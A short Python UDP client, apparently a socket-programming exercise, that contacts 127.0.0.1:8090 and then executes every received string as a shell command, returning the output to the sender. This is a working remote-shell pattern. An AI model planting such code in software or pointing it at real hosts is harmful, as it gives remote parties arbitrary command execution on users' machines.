import socket
import subprocess

sk = socket.socket(type=socket.SOCK_DGRAM)
addr = ('127.0.0.1', 8090)

sk.sendto('bagaki'.encode('utf-8'), addr)
while True:
    cmd, addr = sk.recvfrom(1024)
    ret = subprocess.Popen(cmd.decode('gbk'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    std_out = 'stdout: '+(ret.stdout.read()).decode('gbk')
    std_err = 'stderr: '+(ret.stderr.read()).decode('gbk')
    print(std_out)
    print(std_err)

    sk.sendto(std_out.encode('utf-8'), addr)
    sk.sendto(std_err.encode('utf-8'), addr)

sk.close()